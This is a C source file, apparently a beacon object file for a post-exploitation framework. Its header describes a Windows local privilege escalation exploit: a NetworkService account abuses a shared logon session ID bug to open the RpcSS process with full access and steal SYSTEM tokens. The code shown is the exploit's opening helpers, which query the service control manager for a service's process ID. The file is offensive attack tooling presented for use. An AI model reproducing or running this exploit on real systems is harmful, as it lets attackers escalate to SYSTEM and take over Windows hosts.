/*!
 *
 * Network Service Exploit: Abuses the shared logon
 * session ID bug documented by James Forshaw that
 * permits a NetworkService account to acquire a
 * session ID matching RpcSS service, allowing it to
 * open the process with ALL_ACCESS handle.
 *
 * Using this access, the attacker may be able to
 * enumerate any active handles open within the 
 * process, and steal any SYSTEM tokens available to
 * it.
 *
 * For the bug to work properly, the attacker must
 * create a named pipe server handle and access it
 * from the local NPFS redirection using localhost 
 * as the server name.
 *
!*/
#include "common.h"

static 
HANDLE ServiceOpenControl(
	IN DWORD dwDesiredAccess
	)
{
	/*++
	 *
	 * Function will open the local service control manager
	 * (SCM) using OpenSCManagerA() with the specified access
	 * and return a handle back to the user.
	 *
	 * Returns "NULL" if the function fails.
	 *
	--*/
	return ADVAPI32$OpenSCManagerA( NULL, NULL, dwDesiredAccess );
};

static
HANDLE ServiceOpen(
	IN SC_HANDLE ServiceMan,
	IN LPCSTR lpServiceName,
	IN DWORD dwDesiredAccess
	)
{
	/*++
	 *
	 * Opens the service of the specified name, and
	 * returns a handle for usage by the client. The
	 * client is responsible for closing the service
	 * handle.
	 *
	--*/
	return ADVAPI32$OpenServiceA( ServiceMan,
								  lpServiceName,
								  dwDesiredAccess );
};

DWORD GetServiceProcessId(
	IN LPCSTR lpServiceName
	)
{
	DWORD                  dwProcessId = 0;
	DWORD                  dwReturnLen = 0;
	SC_HANDLE              hServiceMan = NULL;
	SC_HANDLE              hServicePtr = NULL;
	SERVICE_STATUS_PROCESS ProcessInfo = { 0 };

	/*++
	 *
	 * Connects to the local service control manager,
	 * and opens the service with the limited perm
	 * to query its current status.
	 *
	 * Once it has queries its status, it will try 
	 * to read its process id value.
	 *
	--*/

	hServiceMan = ServiceOpenControl(0);
	if ( hServiceMan != NULL ) {
		hServicePtr = ServiceOpen( hServiceMan, lpServiceName, SERVICE_QUERY_STATUS );
		if ( hServicePtr != NULL ) {
			ADVAPI32$QueryServiceStatusEx( hServicePtr,
										   SC_STATUS_PROCESS_INFO,
										   ( LPBYTE )&ProcessInfo,
										   sizeof(SERVICE_STATUS_PROCESS),
										   &dwReturnLen );

			dwProcessId = ProcessInfo.dwProcessId;
		};
	};

	if ( hServicePtr != NULL )
		ADVAPI32$CloseServiceHandle( hServicePtr );

	if ( hServiceMan != NULL )
		ADVAPI32$CloseServiceHandle( hServiceMan );

	return dwProcessId;
};
